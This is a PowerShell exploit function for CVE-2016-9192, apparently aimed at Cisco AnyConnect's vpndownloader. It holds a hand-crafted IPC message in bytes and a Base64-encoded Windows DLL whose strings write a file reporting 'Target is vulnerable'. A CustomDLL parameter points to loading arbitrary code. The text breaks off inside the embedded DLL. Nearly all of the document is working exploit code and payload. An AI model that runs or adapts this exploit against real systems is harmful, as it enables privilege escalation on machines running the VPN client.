﻿
Function Invoke-CVE-2016-9192 {

param ($CustomDLL)

    [Byte[]] $payload = 
    0x4F, 0x43, 0x53, 0x43,
    
    0x1A, 0x00,
    
    0xE4, 0x00,
    
    0xFF, 0xFF, 0xFF, 0xFF,
    
    0x00, 0x00, 0x00, 0x00,
    
    0x02, 0x00, 0x00, 0x00,
    
    0x00, 0x00, 0x00, 0x00,
    
    0x01,
    
    0x02,
    
    
    0x00, 0x01, 
    0x00, 0x57, 
    0x43, 0x3A, 0x5C, 0x50, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x46,
    0x69, 0x6C, 0x65, 0x73, 0x20, 0x28, 0x78, 0x38, 0x36, 0x29, 0x5C, 0x43,
    0x69, 0x73, 0x63, 0x6F, 0x5C, 0x43, 0x69, 0x73, 0x63, 0x6F, 0x20, 0x41,
    0x6E, 0x79, 0x43, 0x6F, 0x6E, 0x6E, 0x65, 0x63, 0x74, 0x20, 0x53, 0x65,
    0x63, 0x75, 0x72, 0x65, 0x20, 0x4D, 0x6F, 0x62, 0x69, 0x6C, 0x69, 0x74,
    0x79, 0x20, 0x43, 0x6C, 0x69, 0x65, 0x6E, 0x74, 0x5C, 0x76, 0x70, 0x6E,
    0x64, 0x6F, 0x77, 0x6E, 0x6C, 0x6F, 0x61, 0x64, 0x65, 0x72, 0x2E, 0x65,
    0x78, 0x65, 0x00,
    
    
    0x00, 0x02, 
    0x00, 0x12, 
    0x43, 0x41, 0x43, 0x2D, 0x64, 0x6F, 0x65, 0x73, 0x6E, 0x74, 0x2D, 0x6D,
    0x61, 0x74, 0x74, 0x65, 0x72, 0x00,
    
    
    0x00, 0x04,
    0x00, 0x10,
    0x57, 0x69, 0x6E, 0x53, 0x74, 0x61, 0x30, 0x5C, 0x44, 0x65, 0x66, 0x61,
    0x75, 0x6C, 0x74, 0x00,
    
    
    0x80, 0x05,
    0x00, 0x00,
    
    
    0x00, 0x06,
    0x00, 0x57,
    0x43, 0x3A, 0x5C, 0x50, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x46,
    0x69, 0x6C, 0x65, 0x73, 0x20, 0x28, 0x78, 0x38, 0x36, 0x29, 0x5C, 0x43,
    0x69, 0x73, 0x63, 0x6F, 0x5C, 0x43, 0x69, 0x73, 0x63, 0x6F, 0x20, 0x41,
    0x6E, 0x79, 0x43, 0x6F, 0x6E, 0x6E, 0x65, 0x63, 0x74, 0x20, 0x53, 0x65,
    0x63, 0x75, 0x72, 0x65, 0x20, 0x4D, 0x6F, 0x62, 0x69, 0x6C, 0x69, 0x74,
    0x79, 0x20, 0x43, 0x6C, 0x69, 0x65, 0x6E, 0x74, 0x5C, 0x76, 0x70, 0x6E,
    0x64, 0x6F, 0x77, 0x6E, 0x6C, 0x6F, 0x61, 0x64, 0x65, 0x72, 0x2E, 0x65,
    0x78, 0x65, 0x00

    $Base64Dll = "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Z2NjbWFzdGVyXGJ1aWxkLXRkbTMyXGdjY1xtaW5ndzMyXGxpYmdjYwAAAAAAAgQFaW50AAIEB3Vuc2lnbmVkIGludAACAgdzaG9ydCB1bnNpZ25lZCBpbnQAAggFbG9uZyBsb25nIGludAACDARsb25nIGRvdWJsZQACAQZjaGFyAANfaW9idWYAIAGBtQEAAARfcHRyAAGDtQEAAAAEX2NudAABhNkAAAAEBF9iYXNlAAGFtQEAAAgEX2ZsYWcAAYbZAAAADARfZmlsZQABh9kAAAAQBF9jaGFyYnVmAAGI2QAAABQEX2J1ZnNpegABidkAAAAYBF90bXBmbmFtZQABirUBAAAcAAUEJgEAAAZGSUxFAAGLLgEAAAIEBWxvbmcgaW50AAICBXNob3J0IGludAACBAdsb25nIHVuc2lnbmVkIGludAACBAdzaXpldHlwZQACAQZzaWduZWQgY2hhcgACAQh1bnNpZ25lZCBjaGFyAAIIB2xvbmcgbG9uZyB1bnNpZ25lZCBpbnQAB2l4ODZfdHVuZV9pbmRpY2VzAATgAAAAAmABWwwAAAhYODZfVFVORV9TQ0hFRFVMRQAACFg4Nl9UVU5FX1BBUlRJQUxfUkVHX0RFUEVOREVOQ1kAAQhYODZfVFVORV9TU0VfUEFSVElBTF9SRUdfREVQRU5ERU5DWQACCFg4Nl9UVU5FX1NTRV9TUExJVF9SRUdTAAMIWDg2X1RVTkVfUEFSVElBTF9GTEFHX1JFR19TVEFMTAA